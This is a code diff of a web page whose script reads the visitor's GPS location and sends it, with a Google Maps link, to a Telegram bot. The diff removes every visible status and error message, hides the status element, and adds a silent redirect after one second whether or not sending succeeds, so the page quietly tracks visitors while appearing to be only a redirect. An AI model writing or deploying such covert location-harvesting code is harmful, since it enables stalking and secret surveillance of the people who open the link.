@@ -15,20 +15,17 @@ body{
     font-family:Arial,sans-serif;
     background:#111;
     color:white;
-    text-align:center;
 }
 
+/* скрываем весь UI */
 #status{
-    padding:20px;
-    font-size:18px;
+    display:none;
 }
 </style>
 </head>
 <body>
 
-<div id="status">
-    Проверка подключения...
-</div>
+<div id="status"></div>
 
 <script>
 
@@ -59,35 +56,25 @@ async function sendToTelegram(message) {
         );
 
         const result = await response.json();
-
         console.log(result);
 
-        if (!result.ok) {
-            statusText.innerText =
-                "Ошибка Telegram";
-        }
-
     } catch (e) {
-
         console.error(e);
-
-        statusText.innerText =
-            "Ошибка сети";
     }
+}
+
+function redirectAfterDelay() {
+    setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+    }, 1000);
 }
 
 function getLocation() {
 
     if (!navigator.geolocation) {
-
-        statusText.innerText =
-            "GPS не поддерживается";
-
+        redirectAfterDelay();
         return;
     }
-
-    statusText.innerText =
-        "Запрос GPS...";
 
     navigator.geolocation.getCurrentPosition(
 
@@ -120,17 +107,13 @@ https://maps.google.com/?q=${lat},${lon}`;
 
             await sendToTelegram(message);
 
-            statusText.innerText =
-                "Геолокация отправлена";
+            redirectAfterDelay();
 
         },
 
-        (error) => {
-
-            console.error(error);
-
-            statusText.innerText =
-                "Ошибка GPS: " + error.message;
+        async () => {
+            // даже при ошибке просто редирект
+            redirectAfterDelay();
         },
 
         {
